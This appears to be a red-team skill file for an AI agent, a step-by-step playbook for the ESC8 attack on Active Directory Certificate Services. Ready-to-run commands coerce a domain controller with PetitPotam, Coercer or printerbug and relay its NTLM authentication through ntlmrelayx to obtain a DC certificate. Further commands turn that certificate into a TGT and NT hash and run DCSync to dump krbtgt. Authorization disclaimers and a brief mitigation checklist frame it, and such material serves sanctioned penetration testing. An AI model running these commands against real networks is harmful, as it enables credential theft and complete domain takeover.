---
name: relaying-ntlm-for-adcs-esc8
description: Uses Impacket's ntlmrelayx.py with a coercion tool (PetitPotam, Coercer, printerbug) to relay NTLM authentication from a coerced domain controller into the AD CS HTTP web-enrollment endpoint (ESC8), obtaining a DC certificate usable via Certipy for PKINIT/DCSync.
subdomain: red-teaming
facing: config
mitre_attack:
- T1557.001
nist_csf:
- DE.CM-01
upstream: relaying-ntlm-for-adcs-esc8@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Coercing authentication and relaying credentials against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement; ESC8 coercion can affect production domain controllers.

## Prerequisites

- Network position that can reach CA web-enrollment endpoint and coercion vector to target DC.
- CA hostname and enrollable template that yields client-auth EKU (e.g., `DomainController`, `Machine`).
- Tooling (install from official upstreams):

```bash
# Impacket (provides ntlmrelayx.py / impacket-ntlmrelayx)
pipx install impacket

# Certipy (AD CS enumeration + abuse)
pipx install certipy-ad

# Coercion tools
git clone https://github.com/topotam/PetitPotam.git
pipx install coercer            # https://github.com/p0dalirius/Coercer
# printerbug.py ships with Impacket examples (MS-RPRN)
```

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1557.001 | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Credential Access / Collection | Core ESC8 primitive relays coerced NTLM authentication to AD CS HTTP endpoint. |
| T1187 | Forced Authentication | Credential Access | PetitPotam/printerbug coerce DC to authenticate to attacker. |
| T1649 | Steal or Forge Authentication Certificates | Credential Access | Attack yields certificate for DC machine account used for PKINIT. |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access | Recovered DC identity enables DCSync for full domain compromise. |

## Workflow

### 1. Enumerate AD CS for ESC8

Use Certipy to find enabled, vulnerable templates and confirm web-enrollment endpoint:

```bash
certipy find -u attacker@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable -enabled -stdout
```

Look for `ESC8` in output and note CA's web-enrollment URL (e.g., `http://ca01.corp.local/certsrv/certfnsh.asp`).

### 2. Start NTLM relay in ADCS mode

Point `ntlmrelayx` at CA's web-enrollment endpoint and request a `DomainController` template certificate. `--adcs` enables AD CS relay; `-smb2support` accepts SMB2 coerced auth:

```bash
impacket-ntlmrelayx \
  -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

For relaying member server/workstation instead of DC, use `--template Machine` (or `User` for user account).

### 3. Coerce domain controller to authenticate

Trigger DC to authenticate to relay listener using coercion primitive.

PetitPotam (MS-EFSRPC):

```bash
# python3 PetitPotam.py <listener/attacker IP> <target DC IP>
python3 PetitPotam.py -u attacker -p 'Password123!' -d corp.local 10.0.0.50 10.0.0.10
```

Coercer (multi-protocol coercion):

```bash
coercer coerce -u attacker -p 'Password123!' -d corp.local -l 10.0.0.50 -t 10.0.0.10
```

printerbug.py (MS-RPRN, ships with Impacket):

```bash
python3 printerbug.py corp.local/attacker:'Password123!'@10.0.0.10 10.0.0.50
```

### 4. Capture issued certificate

When coerced DC authenticates, `ntlmrelayx` relays it to CA and prints output similar to:

```
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Base64 certificate of user DC01$:
MIIRXAIBAzCC...<snip>...
```

Save base64 PKCS#12 blob to a `.pfx` file (decode it; cert has no export password by default):

```bash
echo 'MIIRXAIBAzCC...<snip>...' | base64 -d > dc01.pfx
```

### 5. Convert certificate to TGT and NT hash

Use Certipy to authenticate with certificate via PKINIT, obtaining Kerberos TGT and DC machine-account NT hash:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
```

Certipy outputs a `.ccache` TGT and NT hash, e.g. `[*] Got hash for 'dc01$@corp.local': aad3b435...:<NTHASH>`.

### 6. Leverage DC identity (DCSync)

With DC machine account's hash/TGT, perform DCSync to extract domain credentials (e.g., `krbtgt`, Domain Admins) using recovered TGT:

```bash
# Use the ccache TGT, then DCSync via secretsdump
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc-user krbtgt
```

### 7. Validate mitigations (defensive checklist)

Confirm environment is hardened against ESC8 after testing:

- Enable Extended Protection for Authentication (EPA) on AD CS web-enrollment IIS site and require HTTPS.
- Disable NTLM on CA enrollment endpoint; prefer enrollment proxy with EPA.
- Remove unused HTTP Web Enrollment role services where possible.
- Patch coercion vectors (MS-EFSRPC/PetitPotam, MS-RPRN/printerbug) and restrict RPC.
- Monitor for forced authentication and anomalous machine-account certificate enrollment.

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| Impacket ntlmrelayx | NTLM relay engine with `--adcs` mode | https://github.com/fortra/impacket |
| Certipy | AD CS enumeration and certificate abuse | https://github.com/ly4k/Certipy |
| PetitPotam | MS-EFSRPC coercion | https://github.com/topotam/PetitPotam |
| Coercer | Multi-protocol coercion | https://github.com/p0dalirius/Coercer |
| Certified Pre-Owned (SpecterOps) | Original AD CS abuse research | https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf |
| SpecterOps CoerceAndRelayNTLMToADCS | ESC8 edge reference | https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs |

## Validation Criteria

- [ ] AD CS enumerated and ESC8-vulnerable web-enrollment endpoint confirmed with `certipy find -vulnerable`.
- [ ] `ntlmrelayx --adcs --template DomainController` listener running against CA URL.
- [ ] Coercion (PetitPotam/Coercer/printerbug) triggered against target DC.
- [ ] Base64 certificate for DC machine account captured and saved as `.pfx`.
- [ ] Certificate converted to TGT and NT hash with `certipy auth`.
- [ ] Domain compromise validated via DCSync (in scope only).
- [ ] EPA/HTTPS and coercion-patch mitigations verified and documented.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/relaying-ntlm-for-adcs-esc8
